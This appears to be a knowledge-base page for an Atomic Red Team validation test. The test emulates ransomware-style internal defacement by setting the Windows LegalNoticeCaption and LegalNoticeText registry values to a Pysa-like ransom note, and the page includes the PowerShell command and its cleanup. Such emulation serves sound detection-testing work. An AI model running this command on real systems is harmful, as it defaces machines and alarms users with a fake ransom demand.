---
atomic_guid: "ffcbfaab-c9ff-470b-928c-f086b326089b"
title: "Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message"
framework: "atomic"
generated: "true"
attack_technique_id: "T1491.001"
attack_technique_name: "Defacement: Internal Defacement"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1491.001/T1491.001.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "ffcbfaab-c9ff-470b-928c-f086b326089b"
  - "Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message

Display ransom message to users at system start-up by configuring registry keys HKLM\SOFTWARE\Micosoft\Windows\CurrentVersion\Policies\System\LegalNoticeCaption and HKLM\SOFTWARE\Micosoft\Windows\CurrentVersion\Policies\System\LegalNoticeText.

[SynAck Ransomware](https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/synack-ransomware-leverages-process-doppelg-nging-for-evasion-and-infection), 
[Grief Ransomware](https://redcanary.com/blog/grief-ransomware/), 
[Maze Ransomware](https://cyware.com/research-and-analysis/maze-ransomware-a-deadly-combination-of-data-theft-and-encryption-to-target-us-organizations-8f27),
[Pysa Ransomware](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-destructive-pysa-ransomware),
[Spook Ransomware](https://community.fortinet.com/t5/FortiEDR/Threat-Coverage-How-FortiEDR-protects-against-Spook-Ransomware/ta-p/204226),
[DopplePaymer Ransomware](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Dopplepaymer&threatId=-2147221958),
[Reedemer Ransomware](https://blog.cyble.com/2022/07/20/redeemer-ransomware-back-action/),
[Kangaroo Ransomware](https://www.bleepingcomputer.com/news/security/the-kangaroo-ransomware-not-only-encrypts-your-data-but-tries-to-lock-you-out-of-windows/)

## Metadata

- Atomic GUID: ffcbfaab-c9ff-470b-928c-f086b326089b
- Technique: T1491.001: Defacement: Internal Defacement
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1491.001/T1491.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1491-defacement|T1491.001]]

## Input Arguments

### legal_notice_caption

- description: Title of ransom message
- type: string
- default: PYSA

### legal_notice_text

- description: Body of ransom message
- type: string
- default: Hi Company, every byte on any types of your devices was encrypted. Don't try to use backups because it were encrypted too. To get all your data contact us:xxxx@onionmail.org

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption).LegalNoticeCaption
$orgLegalNoticeText = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText).LegalNoticeText
$newLegalNoticeCaption = "#{legal_notice_caption}"
$newLegalNoticeText = "#{legal_notice_text}"
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force
```

### Cleanup

```powershell
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $orgLegalNoticeCaption -Type String -Force
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $orgLegalNoticeText -Type String -Force
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1491.001/T1491.001.yaml)
